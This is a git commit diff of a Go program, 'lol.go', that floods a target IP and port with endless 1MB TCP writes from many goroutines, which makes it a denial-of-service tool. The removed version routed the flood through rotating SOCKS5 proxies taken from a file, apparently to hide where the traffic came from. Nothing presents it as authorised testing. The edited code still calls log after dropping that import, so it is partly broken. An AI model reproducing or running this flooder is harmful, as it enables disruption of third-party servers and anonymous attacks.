01a1aa61152e9ff497c60de121cb5d468baa2795
Biasstudents <139652035+Biasstudents@users.noreply.github.com>
2023-11-16 23:36:10 +0600

    Update lol.go

--- lol.go
+++ lol.go
@@ -1,80 +1,24 @@
 package main
 
 import (
-	"bufio"
 	"fmt"
-	"io/ioutil"
-	"log"
+	"net"
+	"bufio"
 	"os"
 	"strconv"
-	"strings"
 	"sync"
-
-	netproxy "golang.org/x/net/proxy"
 )
 
-type Proxy struct {
-	address string
-	failed  int
-	mu      sync.Mutex
-}
-
-func (p *Proxy) fail() {
-	p.mu.Lock()
-	defer p.mu.Unlock()
-	p.failed++
-}
-
-func (p *Proxy) reset() {
-	p.mu.Lock()
-	defer p.mu.Unlock()
-	p.failed = 0
-}
-
-func (p *Proxy) isFailed() bool {
-	p.mu.Lock()
-	defer p.mu.Unlock()
-	return p.failed >= 2
-}
-
-func stressServer(address string, wg *sync.WaitGroup, data []byte, proxies []*Proxy, i int) {
+func stressServer(address string, wg *sync.WaitGroup, data []byte) {
 	defer wg.Done()
 
 	for {
-		proxy := proxies[i%len(proxies)]
-		if proxy.isFailed() {
-			log.Printf("Proxy %s has failed too many times, skipping...\n", proxy.address)
-			i++
-			continue
-		}
+		conn, _ := net.Dial("tcp", address)
 
-		log.Printf("Attempting to connect to server %s using proxy %s...\n", address, proxy.address)
-		dialer, err := netproxy.SOCKS5("tcp", proxy.address, nil, netproxy.Direct)
-		if err != nil {
-			log.Printf("Error creating dialer for proxy %s: %v\n", proxy.address, err)
-			proxy.fail()
-			i++
-			continue
-		}
-
-		conn, err := dialer.Dial("tcp", address)
-		if err != nil {
-			log.Printf("Error dialing server %s using proxy %s: %v\n", address, proxy.address, err)
-			proxy.fail()
-			i++
-			continue
-		}
-
-		log.Printf("Successfully connected to server %s using proxy %s. Starting to send data...\n", address, proxy.address)
 		for {
-			_, err := conn.Write(data)
-			if err != nil {
-				log.Printf("Error writing data to server %s using proxy %s: %v\n", address, proxy.address, err)
-				break
-			}
+			conn.Write(data)
 		}
 
-		log.Printf("Closing connection to server %s using proxy %s...\n", address, proxy.address)
 		conn.Close()
 	}
 }
@@ -98,22 +42,12 @@ func main() {
 		log.Fatal(err)
 	}
 
-	proxyData, err := ioutil.ReadFile("socks5.txt")
-	if err != nil {
-		log.Fatal(err)
-	}
-	proxyAddresses := strings.Split(string(proxyData), "\n")
-	proxies := make([]*Proxy, len(proxyAddresses))
-	for i, proxyAddress := range proxyAddresses {
-		proxies[i] = &Proxy{address: proxyAddress}
-	}
-
 	address := ip + ":" + port
 	data := make([]byte, 1024*1024) // 1MB
 	var wg sync.WaitGroup
 	for i := 0; i < threads; i++ {
 		wg.Add(1)
-		go stressServer(address, &wg, data, proxies, i) // Start a new goroutine
+		go stressServer(address, &wg, data) // Start a new goroutine
 	}
 
 	wg.Wait()
